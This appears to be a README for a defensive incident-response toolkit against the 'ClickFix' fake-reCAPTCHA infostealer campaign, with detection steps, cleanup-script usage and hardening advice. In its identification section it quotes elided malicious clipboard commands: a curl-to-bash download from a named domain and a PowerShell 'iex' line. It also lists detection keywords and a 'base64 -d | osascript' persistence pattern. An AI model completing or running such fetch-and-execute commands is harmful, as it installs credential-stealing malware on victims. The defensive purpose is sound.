# 🛡️ Defense Toolkit: Cross-Platform ClickFix & Infostealer DFIR Suite

A complete, native **Digital Forensics & Incident Response (DFIR)** and remediation toolkit engineered to combat the widespread **"ClickFix" (Fake reCAPTCHA)** malware campaign across **macOS**, **Windows**, and **Cloudflare Edge Networks**.

This repository provides automated, native diagnostic and cleanup engines, real-world threat intelligence, and step-by-step incident response procedures—**requiring zero third-party software or paid subscriptions**.

---

<div align="center">
  <br/>
  <img src="screenshots/fake-recaptcha.jpg" width="360" alt="Fake reCAPTCHA Verification Prompt" />
  <p><em>Figure 1: The deceptive "ClickFix" prompt instructing visitors to paste malicious terminal commands disguised as a security verification check.</em></p>
  <br/>
</div>

---

## 📑 Table of Contents
1. [Understanding the Threat Ecosystem](#-understanding-the-threat-ecosystem)
2. [How to Identify Compromised Systems](#-how-to-identify-compromised-systems)
   - [Webmasters & Cloudflare Accounts](#1-webmasters--cloudflare-accounts)
   - [macOS Systems](#2-macos-systems)
   - [Windows Systems](#3-windows-systems)
3. [Incident Remediation & Fixing](#-incident-remediation--fixing)
   - [Automated macOS Cleanup (`macOS-Forensic-Cleanup.sh`)](#-macos-automated-cleanup)
   - [Automated Windows Cleanup (`Windows-Forensic-Cleanup.ps1`)](#-windows-automated-cleanup)
   - [Cloudflare Edge Remediation](#-cloudflare-edge-remediation)
4. [Future Prevention & Hardening Checklist](#-future-prevention--hardening-checklist)
5. [Repository Structure](#-repository-structure)

---

## 🌐 Understanding the Threat Ecosystem

The ClickFix threat campaign operates as a multi-stage, cross-platform cybercrime feedback loop:

```
[Infected Website Visitor] 
       │
       ▼  Tricked into pasting clipboard command into Terminal or Win+R
[Local Endpoint Infection] 
       │  macOS: Atomic Stealer (AMOS) + XMRig Cryptominer
       │  Windows: Lumma / Stealc / Vidar Infostealer
       ▼
[Credential & Session Exfiltration]
       │  Extracts browser passwords, cookies, and Cloudflare tokens to C2
       ▼
[Automated Cloudflare Hijacking]
       │  Botnet logs into victim's Cloudflare account via rotating proxies
       ▼
[Rogue Cloudflare Worker Deployment]
       │  Deploys `worker-*.js` bound to all hosted domain routes (`*domain.com/*`)
       ▼
[Decentralized Blockchain C2 & In-Flight Injection]
       │  Queries BSC/Polygon testnet RPCs (`eth_call 0x6d4ce63c`)
       │  Dynamically injects fake reCAPTCHA prompt into every visitor's HTML before </body>
       ▼
(Cycles to new victims across all websites hosted on the Cloudflare account)
```

---

## 🔍 How to Identify Compromised Systems

### 1. Webmasters & Cloudflare Accounts
* **Symptom:** All your websites suddenly show a "Verify you are human" or "Cloudflare Verification" popup, but your server files (WordPress, Laravel, Nginx) are clean.
* **Test Origin vs. Edge:**
  ```bash
  # Test via Cloudflare CDN (Injected response):
  curl -s https://yourdomain.com/ | grep -i "0x6d4ce63c"

  # Test directly against Origin Server IP (Clean response):
  curl -s http://YOUR_SERVER_IP/ -H "Host: yourdomain.com" | grep -i "0x6d4ce63c"
  ```
* **Audit Cloudflare Workers:** Go to **Cloudflare Dashboard &rarr; Workers & Pages**. Check for unfamiliar workers (e.g. `worker-shrill-cell-*`, `worker-tight-glitter-*`) mapped to `* + XX other routes`.
* **Audit Cloudflare Audit Logs:** Look for suspicious `LOGIN` events followed within seconds by `Create Worker` originating from unfamiliar proxy IP addresses.

### 2. macOS Systems
* **Clipboard Traps:** If clicking "Verify" copied a command starting with:
  `/bin/bash -c "$(curl ... 'prostafene.com' ...)"; echo ""BotGuard: Answer the protector challenge...`
* **Active Persistence:** Check `~/Library/LaunchAgents/` for randomized plists (e.g. `com.fwvfahbogiryrgky.plist`) containing `base64 -d | osascript`.
* **Staged Miners:** Check `/private/tmp/` for folders named `rigupdater/` or `xmrig`.

### 3. Windows Systems
* **Clipboard Traps:** If clicking "Verify" asked you to press `Win + R` and `Ctrl + V`, which pasted:
  `<# Verification code: ... #> $w=...;$x=...;iex $y`
* **PowerShell History Audit (Run in PowerShell as Administrator):**
  ```powershell
  Get-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue | Select-String "Verification code", "superfuckingpanel", "7zip.exe", "bxor"
  ```
  *If any output appears, the Windows system executed the ClickFix payload.*

---

## 🛠️ Incident Remediation & Fixing

### 🍎 macOS Automated Cleanup

Run the native DFIR bash script (requires zero external tools or Homebrew dependencies):

```bash
# 1. Make the script executable
chmod +x macOS-Forensic-Cleanup.sh

# 2. Run a safe simulation audit (Dry-Run mode, makes zero changes to disk)
./macOS-Forensic-Cleanup.sh --dry-run --verbose

# 3. Execute live remediation (terminates malware, quarantines plists, backs up files)
./macOS-Forensic-Cleanup.sh --execute
```

**What it remediates:**
* Terminates rogue `xmrig`, `rigupdater`, and smart contract AppleScript loop processes.
* Audits and quarantines unauthorized LaunchAgents in `~/Library/LaunchAgents`.
* Deletes staged binaries and exfiltration logs in `/private/tmp/` with SHA-256 backup logging.
* Audits shell startup files (`.zshrc`, `.bashrc`) and non-Apple Login Items.

---

### 🪟 Windows Automated Cleanup

Run the native PowerShell DFIR utility (requires zero third-party antivirus software):

```powershell
# 1. Open PowerShell as Administrator and run a safe simulation audit:
.\Windows-Forensic-Cleanup.ps1 -DryRun

# 2. Execute live remediation:
.\Windows-Forensic-Cleanup.ps1
```

**What it remediates:**
* Purges malicious commands from the `Win + R` Run dialog history (`RunMRU`).
* Backs up and wipes the infected `ConsoleHost_history.txt` PowerShell history.
* Terminates active cryptominers and rogue processes running out of temporary folders.
* Quarantines staged archives (`7zip.exe`, `a.exe`, `a.zip`) in `%APPDATA%` and `%TEMP%`.
* Audits registry startup keys (`Run` / `RunOnce`) and non-Microsoft scheduled tasks.
* Triggers a native Windows Defender deep scan in the background.

---

### ☁️ Cloudflare Edge Remediation

1. **Delete Rogue Workers:** In the Cloudflare Dashboard &rarr; **Workers & Pages** &rarr; select the rogue worker &rarr; click **Delete**.
2. **Purge Cache Across All Domains:** Under each domain &rarr; **Caching** &rarr; **Configuration** &rarr; **Purge Everything**.
3. **Invalidate Attacker Sessions:** Go to **My Profile** &rarr; **Sessions** &rarr; click **Log out of all sessions**.
4. **Change Password & Enforce 2FA:** Rotate account passwords immediately and activate an Authenticator App (TOTP).

---

## 🛡️ Future Prevention & Hardening Checklist

### 1. Browser Defense (Primary Passwords)
* **Firefox:** Infostealers read `logins.json` and `key4.db` from disk. To stop them:
  * Go to **Settings &rarr; Privacy & Security &rarr; Logins and Passwords**.
  * Check **"Use a primary password"** and set a strong master passphrase.
  * *Result:* The password database is strongly encrypted on disk and cannot be decrypted by malware without your master key.
* **Chrome / Edge:** Avoid storing critical server or administrative credentials in browser storage. Use a dedicated password manager (Bitwarden, 1Password) with biometric unlock.

### 2. Account Security & Session Hygiene
* **Enforce 2FA Everywhere:** Enable TOTP Authenticator 2FA on Cloudflare, server hosting portals, registrars, and email. Stolen passwords cannot bypass 2FA.
* **Scoped Cloudflare API Tokens:** Avoid using the Global API Key. If third-party software (like cPanel/CyberPanel) manages DNS/SSL, issue restricted, single-domain API tokens with least-privilege permissions.
* **Periodic Session Invalidation:** Regularly use "Log out of all active sessions" across critical cloud and development accounts.

### 3. User Training & Behavioral Hygiene
* **The Golden Rule of reCAPTCHA:** No legitimate verification service will **ever** instruct you to open a terminal, press `Win + R`, or paste text to solve a CAPTCHA.
* **If you see verification instructions asking for keyboard shortcuts (`Win + R`, `Ctrl + V`, `Terminal`), close the browser tab immediately.**

---

## 📦 Repository Structure

```text
defense-toolkit/
├── macOS-Forensic-Cleanup.sh           # Native macOS DFIR cleanup utility (v1.1.0)
├── Windows-Forensic-Cleanup.ps1        # Native Windows DFIR cleanup utility (PowerShell)
├── CLOUDFLARE_WORKER_THREAT_ADVISORY.md# In-depth technical advisory for webmasters
├── WINDOWS_CLICKFIX_REMEDIATION_GUIDE.md# Non-technical guide for Windows users
├── README.md                           # Master documentation & response playbook
├── CHANGELOG.md                        # Version history and detection notes
├── LICENSE                             # MIT License
├── .gitignore                          # Safeguards against committing private logs
└── screenshots/
    ├── README.md                       # Screenshot contribution guidelines
    └── fake-recaptcha.jpg              # Deceptive ClickFix verification modal reference
```

---

## 📄 License & Safety Guarantees
* **License:** MIT License. Free to use, adapt, and distribute for security professionals and the public.
* **Safety First:** Both utilities default to non-destructive auditing, provide full logging, and generate automatic backups before modifying any persistent items.
